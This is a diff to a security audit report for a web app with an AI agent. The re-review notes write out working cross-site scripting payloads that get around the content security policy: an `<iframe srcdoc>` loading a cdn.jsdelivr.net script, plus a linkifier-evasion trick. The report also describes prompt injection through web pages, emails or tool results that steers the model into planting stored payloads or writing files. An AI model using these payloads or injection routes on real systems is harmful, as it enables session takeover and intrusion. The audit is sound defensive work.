+  element content. The injected script runs with the user's session and `connect-src 'self'`, so it
+  can call every API the user can, which for an admin includes the shell routes. Seven findings in
+  this run describe such sinks and rated them on the assumption that the policy held:
+
+  | Sink | Section | Attacker input |
+  | --- | --- | --- |
+  | Research spinner | `static-js-chat` | A search result's title |
+  | Calendar event location | `static-js-documents-email` | A synced or imported event |
+  | Theme grid and `/theme` reply | `static-js-rest`, `static-js-chat` | A theme name from the model's `ui_control` call |
+  | Metrics popup, model picker | `static-js-chat`, `static-js-cookbook-settings-models` | A configured endpoint's model id or name |
+  | Task form textarea | `static-js-rest` | A model-authored task prompt |
+  | Research report body | `static-js-research-memory-rag` | Page text in a report; the branch is unreachable today |
+
+  This finding is medium because it needs one of those sinks. The first two are rated high in their
+  own sections; the policy is counted once, here. Attribute-only injection, as in the email chip
+  finding in `static-js-documents-email`, cannot create a frame and is not affected.
+- **Fix:** remove `https://cdn.jsdelivr.net` from `script-src`. Its one consumer is the Pyodide
+  loader (`static/js/codeRunner.js:156`): serve Pyodide from `/static/`, or load it inside a
+  sandboxed frame that carries its own policy. Fix the sinks as well; the policy is the second
+  layer, and it is the layer that failed.
 
 ## 6. core: database, atomic IO, constants, platform
 
@@ -15635,8 +15654,8 @@ programmatically; its output is quoted in finding 7.
 - **Location:** `static/js/chat.js:3153` and `:6068` (the message), `static/js/chat.js:2042` and
   `:6051` (the spinner those messages go to), sink at `static/js/spinner.js:332` via
   `:383-390`
-- **Severity:** medium
-- **Disposition:** next
+- **Severity:** high
+- **Disposition:** fix-now
 - **Evidence:** the research progress handler interpolates a web page title into the spinner:
 
   ```js
@@ -15694,9 +15713,7 @@ programmatically; its output is quoted in finding 7.
 
   The probe installs the same browser stubs the repository's own
   `tests/test_spinner_stops_when_never_attached_js.py` uses and imports the real module, so the
-  sink is the shipped code path, not a reimplementation. I did not run a browser; parsing that
-  markup as HTML (and therefore firing `onerror`) is the standard consequence of assigning it to
-  `innerHTML`.
+  sink is the shipped code path, not a reimplementation. That pass did not run a browser.
 - **Impact:** any authenticated user who runs Deep Research with web search enabled — research is a
   per-user privilege that defaults on (`routes/chat_routes.py:1562`
   `_privs.get("can_use_research", True)`), not an admin feature — has attacker-authored markup
@@ -15705,24 +15722,28 @@ programmatically; its output is quoted in finding 7.
   its `<title>`; the spinner re-assigns `innerHTML` on every animation frame (150 ms), so the
   payload re-parses for as long as the reading phase lasts.
 
-  The app's own CSP stops this short of script execution. The chat page is served by
-  `core/middleware.py:141-147` with `script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net` — no
-  `'unsafe-inline'` — and the nonce is per-request (`:90` `secrets.token_hex(16)`) and templated into
-  every inline block in `static/index.html` (7 blocks, each `<script nonce="{{CSP_NONCE}}">`), so an
-  injected `<img onerror>`, `<svg onload>` or `<script>` is refused. The report page is the
-  exception: `core/middleware.py:115-123` gives `/api/research/report/` `script-src 'self'
-  'unsafe-inline'`, which is why the same class of markup injection is treated as execution there
-  (`tests/test_security_regressions.py:1212-1220`). What remains reachable on the chat page is
-  markup injection: content that spoofs or covers the UI, an attacker link or `<img src>` beacon
-  (`img-src` allows `https:`), and, since the policy sets no `form-action` and no `base-uri`, a form
-  that submits off-origin. This is a medium for that reason and not a high — but the sink is one
-  CSP-relaxation away from execution, so it is worth fixing at the sink rather than at the call
-  sites.
+  The app's CSP refuses the inline handler and does not refuse a frame. The chat page is served by
+  `core/middleware.py:141-147` with `script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net`, so
+  an injected `<img onerror>` or `<script>` does not run. An injected `<iframe srcdoc>` whose
+  document loads a script from `cdn.jsdelivr.net` does: the frame inherits the page's origin and
+  policy, and that CDN serves any public npm package or GitHub file. The script then acts with the
+  user's session against every API the user can call, which for an admin includes the shell routes.
+  The policy defect is its own finding in `core-auth-session`.
+
+  One link is not measured: whether a given search provider returns a markup-bearing title of about
+  75 characters unmodified. The providers' JSON titles are passed through as read
+  (`services/search/providers.py:178`, `:346`, `:442`), and nothing in this repository strips them.
 
   The `error` phase has the same problem through `rp.message`, which carries the provider exception
   text (`src/deep_research.py:329`, reached after `max_empty_rounds` consecutive empty rounds, with
   `_last_search_error = f"{prov}: {e}"` at `:591`) — a string that can include an upstream response
   body.
+- **Re-review (2026-10-05):** raised from medium to high. The first pass reasoned that the CSP
+  stops execution and did not run a browser. In headless Chromium, with `spinner.js` imported
+  unmodified, the app's policy string and a title carrying an `<iframe srcdoc>` whose document
+  loads `https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js`, the CDN script ran in a frame
+  whose origin is the page's. The `<img onerror>` title gave no execution. The 150 ms re-parse did
+  not prevent the load. The probe and its output are in the policy finding in `core-auth-session`.
 - **Fix:** make the message text, not markup, at the sink: in `spinner.js` `updateDisplay`, build
   the frame and message as two nodes (`element.textContent = display` plus a text-only frame span,
   or `element.replaceChildren(frameText, msgText)`), which also removes the re-parse per frame. If
@@ -15783,10 +15804,18 @@ programmatically; its output is quoted in finding 7.
   `innerHTML` whenever the theme grid is built. `theme.js` is `static-js-rest`'s path; it is cited
   here as reachability, not claimed as this section's finding.
 - **Impact:** untrusted content that steers the model (a web page, an email, a tool result) plants
-  a payload in the user's persisted theme store with one `create_theme` call. It executes when the
+  a payload in the user's persisted theme store with one `create_theme` call. It is parsed when the
   user runs bare `/theme` or `/theme <unknown>` in this section's sink, and — more likely, and
   without any slash command — when the theme grid renders, which is the same origin-wide
   consequence as finding 1. The user sees a "custom theme" they never created.
+- **Re-review (2026-10-05):** stands at medium, with two corrections. A name carrying an `<iframe
+  srcdoc>` runs script from `cdn.jsdelivr.net` in the app origin (measured for the theme grid; see
+  the policy finding in `core-auth-session`), so the consequence is execution, not markup only.
+  And the model cannot be steered freely: `ui_control` carries `ToolEffect.UI_SIDE_EFFECT`
+  (`src/tool_capabilities.py:226-231`), which `decision_for` blocks once untrusted content is in
+  the run unless the user approves the call (`:553-564`, `:654-684`). The reach is a call made
+  before the gate arms, or a theme-creation prompt the user approves. That gate is why this is not
+  high.
 - **Fix:** escape the names where they are interpolated (`customNames.map(ctx.esc).join(', ')` in
   both places), and validate the name at the boundary: restrict `theme_name` to
   `[a-z0-9_-]+` in `src/ai_interaction.py`'s `create_theme` branch (and in `theme.js`
@@ -15830,16 +15859,18 @@ programmatically; its output is quoted in finding 7.
 - **Impact:** a user who points Odysseus at an OpenAI-compatible endpoint that reports a
   markup-bearing `model` field has that markup parsed into the app origin when they open the metrics
   popup on a response. The endpoint already sees that user's prompts, so the added capability is
-  "the endpoint can also author markup in the browser" — a real widening, but not code execution:
-  the popup renders in the chat page, which carries the nonce policy (`core/middleware.py:141-147`,
-  `script-src 'self' 'nonce-{nonce}'` with no `'unsafe-inline'`), so an injected handler is refused
-  and what remains is content that can spoof or cover the popup, carry a link, or fire an `<img
-  src>` beacon. It requires the user or their admin to have configured that endpoint. The two
+  "the endpoint can also author markup in the browser" — a real widening. An injected inline
+  handler is refused by the nonce policy (`core/middleware.py:141-147`); an injected
+  `<iframe srcdoc>` that loads script from `cdn.jsdelivr.net` is not, as the policy finding in
+  `core-auth-session` measures, so the endpoint can run script in the user's session. It requires the user or their admin to have configured that endpoint. The two
   popups are also inconsistent with the escaping used
   everywhere else in the file, which is what makes this an oversight rather than a decision — the
   repository already pins that discipline for this surface in
   `tests/test_chat_tool_screenshot_xss.py` ("Streaming tool labels are escaped before inner_html":
   `'<span class="agent-thread-tool">${esc(toolLabel)}</span>' in chat`).
+- **Re-review (2026-10-05):** stands at low. The impact was corrected: the first pass said the
+  policy rules out code execution, and a `srcdoc` frame is not ruled out. Low is kept because the
+  input is the model id of an endpoint the user or an admin configured.
 - **Fix:** escape at both interpolations (`uiModule.esc(model.split('/').pop())`, as `:750` already
   does), or set the model row with `textContent` after the popup is built.
 
@@ -16165,8 +16196,8 @@ verbatim, and one probe page is served with the app's exact CSP header copied fr
 
 - **Location:** `static/js/calendar.js:3437-3449` (the URL branch at `:3439-3444`; sinks at
   `:1709`, `:1775`, `:1902`, `:1915`)
-- **Severity:** medium
-- **Disposition:** next
+- **Severity:** high
+- **Disposition:** fix-now
 - **Evidence:** `_locHTML` escapes each matched URL and nothing else — the text between URLs is
   concatenated into the returned HTML unescaped:
 
@@ -16204,8 +16235,8 @@ verbatim, and one probe page is served with the app's exact CSP header copied fr
 - **Impact:** anyone who can write an event into a calendar the user syncs (a shared or public
   CalDAV collection, or an `.ics` file the user imports) gets arbitrary HTML and CSS rendered inside
   the calendar modal: remote fetches that disclose the user's IP and confirm the calendar is open,
-  CSS that can hide or overlay calendar chrome, and markup that survives until the view re-renders.
-  Script execution is not reachable: `script-src` in the app's policy has no `'unsafe-inline'`, and
+  CSS that can hide or overlay calendar chrome, markup that survives until the view re-renders, and, through an injected `<iframe srcdoc>`, script from `cdn.jsdelivr.net` running in the user's session.
+  An inline handler does not run: `script-src` in the app's policy has no `'unsafe-inline'`, and
   a companion page served with that exact policy (`core/middleware.py:141-152`, `nonce-dummy`
   standing in for the per-response nonce) logged `Executing inline event handler violates the
   following Content Security Policy directive 'script-src 'self' 'nonce-dummy'
@@ -16213,6 +16244,15 @@ verbatim, and one probe page is served with the app's exact CSP header copied fr
   probe page itself was served without the header, so its console was empty; the `<style>` and
   `<img>` effects above are what the policy does not stop, since `style-src` allows `'unsafe-inline'`
   and `img-src` allows `https:` and same-origin fetches.
+- **Re-review (2026-10-05):** raised from medium to high. The first pass tested an inline handler,
+  which the policy refuses, and concluded that script execution is not reachable. With `_locHTML`
+  copied by line range onto a page served with the app's policy, the location
+  `https://maps.example.test/room5 <iframe srcdoc="<script
+  src=https&colon;//cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js></script>">` ran the CDN
+  script in a frame whose origin is the page's. The `&colon;` keeps the script URL out of the
+  linkifier's `https?://` match. The same location without a leading URL takes the escaped branch
+  and does not execute. The script acts with the session of whoever opens the event. See the
+  policy finding in `core-auth-session`.
 - **Fix:** escape the whole string first and linkify the escaped copy, the way
   `static/js/notes.js:517-529` already does (`const escaped = _esc(s); … escaped.replace(urlRe, …)`).
 
@@ -16541,6 +16581,10 @@ by line, so a defect outside those areas could remain.
   panel (`static/js/admin.js:2076` builds `${statusText}` from `s.error`, `:2082` interpolates it into
   `list.innerHTML`); escaping it there is a one-line change, but see the dead-code finding below
   before touching that code.
+- **Re-review (2026-10-05):** stands at low. The impact says injected script does not run; an
+  injected `<iframe srcdoc>` that loads script from `cdn.jsdelivr.net` does (the policy finding in
+  `core-auth-session`). This sink was not probed. Low is kept because the input comes from an
+  endpoint an admin configured or a name an admin typed.
 - **Fix:** escape both interpolations (`esc(displayName)`, `esc(_providerGroupName(provider))`) or
   build them with `textContent` as the rest of the module does.
 
@@ -16921,6 +16965,10 @@ symbols are unused with no behavioural effect, so they are recorded here rather 
   it can do is spoof or cover panel content, carry a link, or fire an `<img src>` beacon. Today the
   branch does not render, so no payload is reachable; the trap is that fixing the dead code without
   fixing this line makes it reachable.
+- **Re-review (2026-10-05):** stands at low because the branch is unreachable. The impact says the
+  markup is "not executed"; once the expansion gate is wired, an `<iframe srcdoc>` in page text
+  would load script from `cdn.jsdelivr.net` (the policy finding in `core-auth-session`). Fix this
+  line before fixing the dead flag.
 - **Fix:** `_markdownModule.mdToHtml(job.result)` instead of `renderContent`, matching the Library
   and chat callers; keep the `_esc` fallback branch as it is.
 
@@ -17391,7 +17439,7 @@ finding is counted in that section.
 - **Impact:** one `create_theme` call from the model — reachable from any content that steers it,
   a fetched page, an email or a tool result — plants a payload in the user's persisted theme store,
   and the payload then re-parses in the app origin on every load without any further interaction.
-  It does not execute there: the chat page carries the nonce policy at `core/middleware.py:141-147`
+  Its inline handler does not execute there: the chat page carries the nonce policy at `core/middleware.py:141-147`
   (`script-src 'self' 'nonce-{nonce}'`, no `'unsafe-inline'`, nonce templated into `index.html`'s
   inline blocks), so the probe's `onerror` handler is refused. The stored payload is still worse
   than the reflected one below, because it is persistent and needs no user action: the injected
@@ -17401,6 +17449,15 @@ finding is counted in that section.
   finding for the slash-reply sink in `slashCommands.js:1468-1470`; this section reports the second
   sink of that root cause and keeps it at `medium` so the run does not count one cause twice, even
   though this sink needs no slash command and no user interaction.
+- **Re-review (2026-10-05):** stands at medium, with two corrections. With the swatch template
+  copied by line range onto a page served with the app's policy, the name
+  `<iframe/srcdoc="<script/src=https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js></script>">`
+  (no spaces, lower case, as `src/ai_interaction.py:759` leaves it) ran the CDN script in a
+  same-origin frame on render. So a stored name executes on every page load. And the path in is
+  narrower than "any content that steers the model": `ui_control` carries
+  `ToolEffect.UI_SIDE_EFFECT`, which `decision_for` blocks once untrusted content is in the run
+  unless the user approves the call (`src/tool_capabilities.py:226-231`, `:553-564`, `:654-684`).
+  That gate is why this is not high.
 - **Fix:** escape the name at the sink (`uiModule.esc(name)` at `theme.js:661`, `:668`, `:669`) and
   reject markup-bearing names at the boundary — restrict `theme_name` to `[a-z0-9_-]+` in
   `src/ai_interaction.py`'s `create_theme` branch and in `saveCustomTheme` before it is stored — so
@@ -17442,6 +17499,10 @@ finding is counted in that section.
   by a deliberate click, which is what keeps this at `low`; the escape hatch is that the payload
   only fires while editing that specific task. A second, quieter consequence is that a prompt
   containing `</textarea>` truncates the field the user sees.
+- **Re-review (2026-10-05):** stands at low. A prompt that closes the textarea and opens an
+  `<iframe srcdoc>` can load script from `cdn.jsdelivr.net` (the policy finding in
+  `core-auth-session`); this sink was not probed. Low is kept because the payload fires only when
+  the user opens that task's edit form.
 - **Fix:** `${_esc(existing?.prompt || '')}` at `tasks.js:1299`, matching the name field above it.
 
 #### [SECURITY] The MCP tool list shadows the quote-escaping `esc` with a weaker local one, so tool metadata injects markup
@@ -17862,6 +17923,10 @@ authenticated `GET /backgrounds` reaches `serve_html_with_nonce` on a missing pa
   the user's cookie — and therefore the user's API, including the agent's shell tools — on the one
   path the app deliberately left remote. Reach is limited to users who run Python in the code
   runner, and the URL is version-pinned, which is why this is `low` rather than higher.
+- **Re-review (2026-10-05):** stands at low for the missing integrity attribute. The allowlist
+  entry that permits this script has a second consequence, reported as the policy finding in
+  `core-auth-session`: injected markup can load any jsDelivr-hosted script through a `srcdoc`
+  frame.
 - **Fix:** vendor the Pyodide runtime under `static/lib/` like every other bundle and drop
   `https://cdn.jsdelivr.net` from `script-src`; if the CDN has to stay, pin the script with an
   `integrity` hash and narrow the policy to that exact URL.
@@ -18123,6 +18188,12 @@ invalidated, or what `manage_rag` is allowed to index.
   and a file written anywhere the process can write, such as `~/.ssh/authorized_keys` when the app
   runs as that user. Without injection the tool is safe, which is what keeps this at medium rather
   than high.
+- **Re-review (2026-10-05):** stands at medium. The impact says only the model's compliance stands
+  between an injected `folder` or `uid` and the write. A second control exists:
+  `download_attachment` carries `READ_PRIVATE` and `WRITE_WORKSPACE`
+  (`src/tool_capabilities.py:194-199`), which `decision_for` blocks once untrusted content is in
+  the run unless the user approves the call. Reading the email that carries the injection arms
+  that gate. Whether the gate covers the MCP-qualified name of this tool was not traced.
 - **Fix:** call the existing `routes.email_helpers.attachment_extract_dir` (or inline its two lines:
   flatten `f"{folder}_{uid}"` to `[A-Za-z0-9._-]`, then assert the resolved path is inside
   `MAIL_ATTACHMENTS_DIR` and return an error text otherwise). Also validate `uid` as digits where it
@@ -23387,7 +23458,7 @@ pytest process here can rewrite it, which is the point of the finding below abou
 
 # Coverage boundaries
 
-What this run did not read or run, what the re-review covered, and which suspected defects were
+What this run did not read or run, what each re-review covered, and which suspected defects were
 checked and rejected. Each section's own Coverage statement is the record for that section; this
 page states the boundary for the run.
 
@@ -23493,6 +23564,56 @@ first-pass evidence only.
   and re-checks the impersonated owner (`routes/research/research_routes.py:496-504`).
 - That a shipped client stores data in the shared bearer bucket. The `grep` in that finding
   returns nothing for `companion`, `swift`, `integrations` and `mcp_servers`.
+
+## Re-review, 2026-10-05
+
+A second independent pass, made after all 58 sections were written. It raised two severities,
+added one finding, corrected the impact of six more, and removed none. The run now holds 400
+findings.
+
+**Changed:**
+
+| Finding | Section | Before | After | Reason |
+| --- | --- | --- | --- | --- |
+| A search-result title reaches the research spinner's `innerHTML` | `static-js-chat` | medium, `next` | high, `fix-now` | The first pass held that the script policy stops execution. An injected `srcdoc` frame loaded a script from `cdn.jsdelivr.net` in the app's origin, with the shipped `spinner.js` and the app's policy string. |
+| A calendar event's location is only partly escaped | `static-js-documents-email` | medium, `next` | high, `fix-now` | The same measurement, with `_locHTML` copied by line range. |
+| `script-src` allowlists `cdn.jsdelivr.net` | `core-auth-session` | not recorded | medium, `fix-now` | New. The policy defect that the two findings above depend on, counted once. |
+
+**Impact corrected, severity unchanged (6):** the theme-name findings in `static-js-chat` and
+`static-js-rest` (execution measured for the theme grid; the `ui_control` tool gate keeps both at
+medium), and four lows whose impact said injected script cannot run: the metrics popup, the model
+picker, the task form textarea and the research report body. The attachment-path finding in
+`mcp-servers` gained the tool gate as a second control. Each carries a `Re-review (2026-10-05)`
+line.
+
+**What was checked:**
+
+| Set | Count | Check |
+| --- | ---: | --- |
+| Quoted code, every finding | 399 | A script compared each quoted code line with the cited files at `2992bf6d368a`. 1,446 of 1,524 lines match verbatim. The 78 that do not were read: each is an abbreviated quote (`...` in a call), a line with an added line number, or code proposed in a Fix. |
+| Cited locations, every finding | 399 | Every `path:line` in a Location field names an existing file and a line inside it. |
+| `fix-now` findings | 6 of 8 | Cited lines re-read. The other two are highs re-derived on 2026-10-04; the source has not changed since. |
+| Mediums | 91 of 106 | Location and impact read against the severity legend. The cited source was opened for 11: the five `fix-now` mediums, three injection findings and three test findings. The other 15 were re-derived on 2026-10-04. |
+| Lows | 11 of 290 | Impact read. These are the lows that cite the script policy. |
+
+**Not done:** 279 lows were not read by either re-review. No first-pass probe script was re-run;
+the probes lived in `/tmp` and were not kept. The three highs from 2026-10-04 were not re-derived a
+second time. The spinner finding's last link, a live search provider returning a markup-bearing
+title unmodified, was not tested.
+
+**Hypotheses this pass tested and rejected:**
+
+- That a `<script src>` assigned through `innerHTML` runs under the policy. It does not; the probe
+  reported `no execution`.
+- That an inline script inside the injected `srcdoc` frame runs. It does not; the frame inherits
+  the policy, and only a script from an allowlisted origin loads.
+- That the frame technique applies to the attribute-injection findings. It does not: `_esc` escapes
+  `<`, so the email chip and MCP tool-list sinks cannot create an element.
+- That a fetched page can make the model plant a theme name unassisted. `ui_control` carries
+  `ToolEffect.UI_SIDE_EFFECT`, which `decision_for` blocks once untrusted content is in the run
+  unless the user approves (`src/tool_capabilities.py:553-564`, `:654-684`).
+- That `tests/conftest.py` redirects the data directory, which would void the finding that a test
+  writes an admin account into the live one. Nothing under `tests/` sets `ODYSSEUS_DATA_DIR`.
 
 ## Hypotheses tested and rejected
 
@@ -24366,35 +24487,24 @@ closed it.
 
 ## Unresolved state
 
-One item is carried forward for a later section rather than left as a finding.
-`tests/test_services_research_low_quality_sources.py:8-9` asserts that
-`services/research/service.py` is the live research path; `specs/research.md:118` and
-`src/app_initializer.py:117` say the live path is `src/research_handler.py` and the
-`services/` copy is compatibility surface to retire. The `services-research` pass found no
-production caller of the copy, so the test's premise is stale. Whether that staleness matters is
-for the `tests-*` pass, which owns that file.
-
-The one observation the previous pass left open — the three `secret_storage import failed;
-skipping <x> migration` warnings from `core/database.py` — is now a finding in
-`core-data-platform.md`. The reproduction is deterministic for a process whose first core-touching
-import is `src.secret_storage`, or a module that imports it first such as `routes.email_helpers`,
-and `import app` under the same conditions reports no skip, so the server boot order is safe. The
-finding records the one-line fix; what remains open is only whether a future entry point takes that
-import order.
+One item is open. `tests/test_services_research_low_quality_sources.py:8-9` asserts that
+`services/research/service.py` is the live research path. `specs/research.md:118` and
+`src/app_initializer.py:117` say the live path is `src/research_handler.py`, and the
+`services-research` section found no production caller of the `services/` copy. So the test's
+premise is stale. `tests-rest` owns that file and did not open it; it is outside that section's
+sample.
 
 ## How to extend this audit
 
 `PROMPT.md` is the assignment a reviewer executes. It gives the finding schema, the evidence
 rules, the section files and the stopping point.
 
-Remaining coverage, most consequential first:
+Remaining work, most consequential first:
 
-1. **`tests-*`.** Establishes whether the suite asserts the negative cases the backend findings
-   rely on, and settles the stale test premise under [Unresolved state](#unresolved-state).
-2. **`static-js-*`.** The largest unread surface. It decides the cross-site scripting and
-   client-side authorization questions this run leaves open.
-3. **Re-review of the findings not yet re-derived.** See
-   [Re-review, 2026-10-04](#re-review-2026-10-04) for what was covered.
+1. **Probe the other markup sinks for script execution.** The 2026-10-05 pass measured three. The
+   metrics popup, the model picker and the task form were corrected by reasoning, not by a probe.
+2. **Read the test files outside the samples.** [Not covered](#not-covered) gives the counts.
+3. **Re-read the 279 lows no re-review opened.**
 4. **`src/outbound_fetch.py` below line 44**, and the tool-to-route boundaries listed under
    [Not covered](#not-covered).
 
